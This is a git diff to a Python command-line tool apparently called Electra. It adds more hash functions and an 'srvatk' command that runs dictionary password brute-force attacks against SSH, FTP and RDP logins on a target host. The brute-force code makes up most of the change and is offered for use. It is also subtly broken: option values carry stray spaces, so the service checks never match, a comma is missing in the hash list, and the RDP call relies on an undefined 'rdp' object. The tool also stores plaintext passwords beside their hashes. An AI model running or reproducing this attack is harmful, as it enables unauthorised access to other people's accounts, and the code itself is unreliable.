@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-import click, sys, os, socket, requests, platform, psutil, subprocess, hashlib, bcrypt
+import click, sys, os, socket, requests, platform, psutil, subprocess, hashlib, bcrypt, paramiko, ftplib, rdp
 
 BANNER = """
 ███████╗██╗     ███████╗ ██████╗████████╗██████╗  █████╗ 
@@ -23,7 +23,8 @@ class BannerGroup(click.Group):
             ("cdir", "Create a new directory in a specified path."),
             ("webpass", "Web Dictionary Password Brute Force Attack."),
             ("webuser", "Web Dictionary Username Brute Force Attack."),
-            ("hashgen", "Generate hash of a specific password.")
+            ("hashgen", "Generate hash of a specific password."),
+            ("srvatk", "Services Dictionary Password Brute Force attack.")
         ]
         with formatter.section("Commands"):
             for cmd, desc in commands:
@@ -185,7 +186,7 @@ def webuser(url, password, wordlist):
 
 #HASHGEN COMMAND
 @cli.command()
-@click.option("-f", "--function", type=click.Choice(["md5", "sha1", "sha256", "bcrypt"], case_sensitive=False), required=True, help="Hash function (MD5, SHA1, BCrypt, etc).")
+@click.option("-f", "--function", type=click.Choice(["md5 ", " sha1 ", " sha224 ", " sha256 ", " sha384 ", " sha512 ", " sha3_224 ", " sha3_256 ", " sha3_384 ", " sha3_512 " " bcrypt"], case_sensitive=False), required=True, help="Hash function (MD5, SHA1, BCrypt, etc).")
 @click.option("-p", "--password", required=True, help="Password to hash.")
 def hashgen(function, password):
     #Generate hash based on selected func
@@ -194,8 +195,22 @@ def hashgen(function, password):
         hashed_pass = hashlib.md5(password.encode()).hexdigest()
     elif function == "sha1":
         hashed_pass = hashlib.sha1(password.encode()).hexdigest()
+    elif function == "sha224":
+        hashed_pass = hashlib.sha224(password.encode()).hexdigest()
     elif function == "sha256":
         hashed_pass = hashlib.sha256(password.encode()).hexdigest()
+    elif function == "sha384":
+        hashed_pass = hashlib.sha384(password.encode()).hexdigest()
+    elif function == "sha512":
+        hashed_pass = hashlib.sha512(password.encode()).hexdigest()
+    elif function == "sha3_224":
+        hashed_pass = hashlib.sha3_224(password.encode()).hexdigest()
+    elif function == "sha3_256":
+        hashed_pass = hashlib.sha3_256(password.encode()).hexdigest()
+    elif function == "sha3_384":
+        hashed_pass = hashlib.sha3_384(password.encode()).hexdigest()
+    elif function == "sha3_512":
+        hashed_pass = hashlib.sha3_512(password.encode()).hexdigest()
     elif function == "bcrypt":
         salt = bcrypt.gensalt()
         hashed_pass = bcrypt.hashpw(password.encode(), salt).decode()
@@ -205,6 +220,57 @@ def hashgen(function, password):
     with open("Electra-Hashed-Passwords.txt", "a") as hashed_passwords:
         hashed_passwords.write(f"{function.upper()} hash: {hashed_pass}, Password: {password}\n")
     click.echo(click.style("[!] Hash successfully saved to Electra-Hashed-Passwords.txt", fg="green"))
+
+#SERVATK COMMAND
+@cli.command()
+@click.option("-s", "--service", type=click.Choice(["ssh ", " ftp ", " rdp"], case_sensitive=False), required=True, help="Specify the service to attack (SSH, FTP, etc).")
+@click.option("-h", "--host", required=True, help="IP, Socket or Hostname of the target.")
+@click.option("-u", "--username", required=True, help="Username for authentication.")
+@click.option("-w", "--wordlist", type=click.Path(exists=True), required=True, help="Path to password wordlist.")
+def srvatk(service, host, username, wordlist):
+    click.echo(click.style(f"[*] Starting {service.upper()} BF attack on {host} ...", fg="blue"))
+    try:
+        with open(wordlist, "r") as file:
+            for password in file:
+                password = password.strip()
+                if service == "ssh":
+                    client = paramiko.SSHClient()
+                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+                    try:
+                        client.connect(host, username=username, password=password, timeout=5)
+                        click.echo(click.style(f"[!] Found SSH password for user: {username} is {password}", fg="green"))
+                        client.close()
+                        return
+                    except paramiko.AuthenticationException:
+                        click.echo(click.style(f"[!] SSH authentication attempt with '{password}' failed.", fg="red"))
+                    except Exception as e:
+                        click.echo(click.style(f"[!] SSH connection error: {e}", fg="red"))
+                elif service == "ftp":
+                    try:
+                        ftp = ftplib.FTP(host)
+                        ftp.login(user=username, passwd=password)
+                        click.echo(click.style(f"[!] Found FTP password for user: {username} is {password}", fg="green"))
+                        ftp.quit()
+                        return
+                    except ftplib.error_perm:
+                        click.echo(click.style(f"[!] FTP authentication attempt with '{password}' failed.", fg="red"))
+                    except Exception as e:
+                        click.echo(click.style(f"[!] FTP connection error: {e}", fg="red"))
+                elif service == "rdp":
+                    try:
+                        rdp = rdp(host=host, username=username, password=password)
+                        if rdp.authenticate():
+                            click.echo(click.style(f"[!] Found RDP password for user: {username} is {password}", fg="green"))
+                            return
+                        else:
+                            click.echo(click.style(f"[!] RDP authentication attemp with '{password}' failed.", fg="red"))
+                    except Exception as e:
+                        click.echo(click.style(f"[!] RDP connection error: {e}", fg="red"))
+        click.echo(click.style(f"[!] {service.upper()} BF attack completed. No valid passwords found.", fg="magenta"))
+    except FileNotFoundError:
+        click.echo(click.style(f"[!] Error: Wordlist file not found.", fg="red"))
+    except Exception as e:
+        click.echo(click.style(f"[!] Error: {e}", fg="red"))
 
 if __name__ == "__main__":
     cli()
